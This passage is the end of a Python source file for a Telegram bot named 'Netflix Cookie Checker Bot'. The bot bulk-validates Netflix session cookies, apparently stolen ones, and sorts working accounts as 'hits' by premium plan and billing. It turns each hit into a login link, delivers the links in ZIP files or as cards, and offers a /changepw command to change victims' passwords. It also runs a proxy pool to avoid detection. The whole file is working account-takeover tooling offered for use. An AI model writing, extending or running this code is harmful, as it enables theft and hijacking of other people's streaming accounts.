                parse_mode=ParseMode.HTML,
                reply_markup=None,
            )
        except Exception:
            pass

        await update.message.reply_text(
            f"📊 <b>Bulk Check — Summary</b>\n\n"
            f"  ✅  Hits (Active)     »  <b>{hits}</b>  (🌟 Premium: {premium_count})\n"
            f"  ⏸️  On Hold           »  <b>{on_hold}</b>\n"
            f"  🔓  Free (No Sub)     »  <b>{frees}</b>\n"
            f"  ❌  Invalid/Expired   »  <b>{invalids}</b>\n"
            f"  ⚠️  Errors            »  <b>{errors}</b>\n\n"
            f"  📦  Total Checked     »  <b>{total}</b>\n"
            f"  ⏱️  Time              »  <b>{time_str}</b>\n"
            f"  🚀  Speed             »  <b>{speed:.1f} acc/min</b>",
            parse_mode=ParseMode.HTML,
        )

        if hits_list:
            delivery = _get_delivery(uid)

            if delivery == "cards":
                # ── Card-by-Card delivery mode ─────────────────────────────
                # Generate NFTokens for all hits in parallel first
                from checker import generate_nftoken as _generate_nftoken
                async def _ensure_token(result: dict) -> None:
                    nft = result.get("nftoken")
                    if not nft or not nft.get("success"):
                        nf_id = result.get("netflix_id")
                        if nf_id:
                            try:
                                t = await loop.run_in_executor(
                                    _EXECUTOR, _generate_nftoken, {"NetflixId": nf_id}
                                )
                                result["nftoken"] = t
                            except Exception:
                                pass

                token_notice = await update.message.reply_text(
                    f"⏳ <b>Generating login links for {len(hits_list)} hit(s)…</b>",
                    parse_mode=ParseMode.HTML,
                )
                await asyncio.gather(
                    *[_ensure_token(r) for r, _, _ in hits_list],
                    return_exceptions=True,
                )
                try:
                    await token_notice.delete()
                except Exception:
                    pass

                # Send each card individually
                card_total = len(hits_list)
                for card_i, (c_result, c_src, _) in enumerate(hits_list, 1):
                    try:
                        c_txt = format_result(c_result, card_i, card_total, source=c_src, user_id=uid)
                        c_kb  = _login_keyboard(c_result)
                        await update.message.reply_text(
                            c_txt, parse_mode=ParseMode.HTML, reply_markup=c_kb
                        )
                        # Brief pause so Telegram doesn't flood-limit us
                        await asyncio.sleep(0.4)
                    except Exception as _ce:
                        logger.warning("Card-by-card send failed for card %d: %s", card_i, _ce)
            else:
                # ── ZIP delivery mode (default) ────────────────────────────
                try:
                    zip_notice = await update.message.reply_text(
                        "⏳ <b>Generating login links &amp; building ZIP…</b>",
                        parse_mode=ParseMode.HTML,
                    )
                    await send_hits_zip(update, hits_list)
                    try:
                        await zip_notice.delete()
                    except Exception:
                        pass
                except Exception as _ze:
                    logger.exception("send_hits_zip failed after bulk check")
                    await update.message.reply_text(
                        f"⚠️ <b>Could not build hits ZIP.</b>\n"
                        f"<i>{type(_ze).__name__}: {_ze}</i>\n\n"
                        "Your hits are listed in the summary above.",
                        parse_mode=ParseMode.HTML,
                    )

                # ── Single best hit card ───────────────────────────────────
                try:
                    sorted_hits = sorted(hits_list, key=lambda x: _score_account(x[0]), reverse=True)
                    best_result, best_src, _ = sorted_hits[0]
                    best_txt = format_result(best_result, 1, 1, source=best_src, user_id=uid)
                    best_kb  = _login_keyboard(best_result)
                    full_best = (
                        f"🏆 <b>Best Hit from this batch</b>  ·  "
                        f"<i>top-ranked by plan · billing · member age</i>\n\n"
                        + best_txt
                    )
                    if len(full_best) > 4090:
                        full_best = full_best[:4087] + "…"
                    await update.message.reply_text(
                        full_best,
                        parse_mode=ParseMode.HTML,
                        reply_markup=best_kb,
                    )
                except Exception as _be:
                    logger.warning("Best hit card failed: %s", _be)
        else:
            await update.message.reply_text("📭 No hits found in this batch.")

    try:
        await status_msg.delete()
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    if not BOT_TOKEN:
        raise ValueError("TELEGRAM_BOT_TOKEN is not set.")

    start_dashboard(port=5000)
    print("✅ Status dashboard running on port 5000")

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        # Handle updates from multiple users truly concurrently
        .concurrent_updates(True)
        # Network timeouts — prevents hangs on slow Telegram API calls
        .read_timeout(30)
        .write_timeout(30)
        .connect_timeout(15)
        .pool_timeout(10)
        .build()
    )

    # ── Command handlers ──────────────────────────────────────────────────
    app.add_handler(CommandHandler("start",    start_command))
    app.add_handler(CommandHandler("help",     help_command))
    app.add_handler(CommandHandler("info",     info_command))
    app.add_handler(CommandHandler("mode",     mode_command))
    app.add_handler(CommandHandler("fullinfo", fullinfo_command))
    app.add_handler(CommandHandler("basic",    basic_command))
    app.add_handler(CommandHandler("settings", settings_command))
    app.add_handler(CommandHandler("changepw", changepw_command))
    app.add_handler(CommandHandler("cancel",   cancel_command))
    app.add_handler(CommandHandler("proxy",    proxy_command))
    app.add_handler(CommandHandler("setadmin", setadmin_command))

    # ── Inline button callbacks ───────────────────────────────────────────
    app.add_handler(CallbackQueryHandler(proxy_admin_callback,  pattern=r"^proxy:"))
    app.add_handler(CallbackQueryHandler(cancel_callback,       pattern=r"^cancel:"))
    app.add_handler(CallbackQueryHandler(mode_callback,         pattern=r"^mode:"))
    app.add_handler(CallbackQueryHandler(setmode_callback,      pattern=r"^setmode:"))
    app.add_handler(CallbackQueryHandler(setdelivery_callback,  pattern=r"^setdelivery:"))
    app.add_handler(CallbackQueryHandler(closesettings_callback, pattern=r"^closesettings$"))
    app.add_handler(CallbackQueryHandler(loginlinks_callback,   pattern=r"^loginlinks:"))
    app.add_handler(CallbackQueryHandler(besthits_callback,     pattern=r"^besthits:"))
    app.add_handler(CallbackQueryHandler(navlinks_callback,     pattern=r"^navlinks:"))
    app.add_handler(CallbackQueryHandler(noop_callback,         pattern=r"^noop$"))
    app.add_handler(CallbackQueryHandler(gen_link_callback,     pattern=r"^genlink:"))

    # ── Message handlers ──────────────────────────────────────────────────
    app.add_handler(MessageHandler(filters.Document.ALL,           handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    # ── Global error handler — must be last ───────────────────────────────
    app.add_error_handler(error_handler)

    # ── Session watchdog + command menu registration ─────────────────────
    async def _post_init(application: Application) -> None:
        asyncio.create_task(_session_watchdog())
        # Register bot commands so they appear in Telegram's / menu
        from telegram import BotCommand
        global _BOT_USERNAME
        _BOT_USERNAME = (await application.bot.get_me()).username or ""
        await application.bot.set_my_commands([
            BotCommand("start",    "Welcome message & overview"),
            BotCommand("help",     "Supported formats & bulk mode guide"),
            BotCommand("info",     "Bot info, live stats & command list"),
            BotCommand("settings", "⚙️ Output format & delivery mode"),
            BotCommand("mode",     "Toggle output mode (Basic / Full Info)"),
            BotCommand("basic",    "Switch to Basic (compact) mode"),
            BotCommand("fullinfo", "Switch to Full Info mode"),
            BotCommand("changepw", "🔐 [BETA] Change a Netflix account password"),
            BotCommand("cancel",   "Cancel any active flow (e.g. /changepw)"),
            BotCommand("proxy",    "🛡 [Admin] Proxy pool manager"),
            BotCommand("setadmin", "🔑 Claim admin role (first use only)"),
        ])

    app.post_init = _post_init

    print("✅ Netflix Cookie Checker Bot is running…")
    app.run_polling(
        drop_pending_updates=True,
        allowed_updates=["message", "callback_query"],
    )


if __name__ == "__main__":
    main()
